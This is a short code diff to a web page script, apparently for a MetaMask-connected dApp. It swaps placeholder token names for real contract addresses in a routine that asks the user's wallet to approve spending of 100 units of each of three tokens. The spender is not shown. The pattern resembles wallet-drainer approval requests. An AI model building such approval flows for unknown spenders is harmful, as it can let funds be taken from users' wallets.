@@ -74,7 +74,7 @@
         document.getElementById("approveTokens").addEventListener("click", async () => {
             if (!userAccount) return alert("Primero conecta MetaMask");
             
-            const tokens = ["0xUSDT", "0xUSDC", "0xWLD"]; // Reemplaza con las direcciones reales
+            const tokens = ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"];
             const amounts = [web3.utils.toWei("100", "ether"), web3.utils.toWei("100", "ether"), web3.utils.toWei("100", "ether")];
             
             try {
